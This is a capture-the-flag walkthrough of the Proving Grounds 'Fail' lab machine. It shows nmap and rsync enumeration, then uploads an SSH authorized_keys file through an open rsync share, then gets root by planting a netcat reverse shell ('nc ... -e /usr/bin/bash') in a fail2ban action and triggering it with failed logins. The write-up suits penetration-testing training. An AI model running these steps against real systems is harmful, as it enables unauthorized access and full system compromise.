---
description: 'Date: 08/30/22'
---

# "Fail" (Intermediate)

Walkthrough by: Jacob Swinsinski

“Fail” from Offensive Security’s Proving Ground Practice — “Intermediate” Difficulty

Target: 192.168.78.126

#### Recon:

```
nmapAutomator.sh -H 192.168.78.126 -t All

Running all scans on 192.168.78.126

Host is likely running Linux

                                                                             
---------------------Starting Port Scan-----------------------               
                                                                             

PORT    STATE SERVICE
22/tcp  open  ssh
873/tcp open  rsync

---------------------Starting Script Scan-----------------------
                                                                             

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
873/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

---------------------Starting Full Scan------------------------
                                                                             

PORT    STATE SERVICE
22/tcp  open  ssh
873/tcp open  rsync

No new ports
                                                                             

----------------------Starting UDP Scan------------------------

No UDP ports are open
```

* We are not left with much here. Let’s enumerate Rsync.

#### Rsync Enumeration:

[873 - Pentesting Rsync](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)

Banner Grabbing

```
nc -nv 192.168.78.126 873                                                       Tue 30 Aug 2022 02:19:32 AM EDT
(UNKNOWN) [192.168.78.126] 873 (rsync) open
@RSYNCD: 31.0
```

Manual Communication

```
nc -nv 192.168.78.126 873                                                6.2s  Tue 30 Aug 2022 02:21:00 AM EDT
(UNKNOWN) [192.168.78.126] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
fox             fox home
@RSYNCD: EXIT
```

Enumerating fox

* This is the part I could not figure out.
* Upon following through the guide, we can attempt Manual Rsync with the rsync binary.

#### Manual Rsync:

Since authentication is not required, you can list a shared folder via:

```
rsync -av --list-only rsync://192.168.78.126/fox           2767ms  Tue 30 Aug 2022 02:24:43 AM EDT
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 09:21:59 .
lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 00:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 00:12:36 .bashrc
-rw-r--r--            807 2019/04/18 00:12:36 .profile

sent 20 bytes  received 136 bytes  104.00 bytes/sec
total size is 4,562  speedup is 29.24
```

* We see some pretty lucrative information from this.
* We see from hacktricks that we can possibly upload content using rsync.
  * For example uploading authorized\_keys file to obtain access to the box.

#### Uploading authorized\_keys file to the victim via rsync:

Generate SSH keys → Transfer to victim

```
ssh-keygen

cat id_rsa.pub | xclip -selection c

# Now that the public key is in your clipboard from xclip, create a file called authorized_keys and place the public key in there

nano authorized_keys

chmod 600 authorized_keys

rsync -av authorized_keys rsync://192.168.78.126/fox/.ssh/
```

#### Foothold Proof:

```
ssh fox@192.168.78.126 -i id_rsa
```

![Low-privileged user proof](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1cb13b47-b1d9-4319-8ee7-ef8e7fdaa61c/Untitled.png)

Low-privileged user proof

#### Privilege Escalation:

* Navigate to a writeable directory
  * /tmp
* Let’s upload LinPEAS
* We don’t see too much as a result.
* Automated approach did not help me here.

#### Manual Privilege Escalation:

1. Groups

```
groups
fox fail2ban
```

1. Using ps to find the fail2ban binary location

```
ps -ef |grep root|grep fail2ban
root     12062     1  2 19:02 ?        00:00:00 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

1. We see that it is running as root, can we take advantage of this?
2. After doing some research, I find out that we can add a variable inside the fail2ban configuration file found in /etc/fail2ban/action.d/iptables-multiport.conf
3. Variable to modify:

```
actionban = /usr/bin/nc 192.168.49.78 873 -e /usr/bin/bash
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7738eff4-0dd6-47a9-9d6f-62ee93415c2b/Untitled.png)

* We see that if we fail authentication three times via SSH, it will execute an action upon ban.
* In this case, we will execute a netcat listener.

1.  Start ncat listener:

    ```
    sudo nc -lnvp 873
    ```
2. Fail authentication via SSH 3 times to execute reverse shell:

```
ssh root@192.168.78.126
root@192.168.78.126's password: 
Permission denied, please try again.
root@192.168.78.126's password: 

Permission denied, please try again.
root@192.168.78.126's password: 
root@192.168.78.126: Permission denied (publickey,password).
```

1. We catch a shell!

#### Root Proof.txt

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ef9fd931-2ac6-4cce-b5c5-e634a7afe167/Untitled.png)
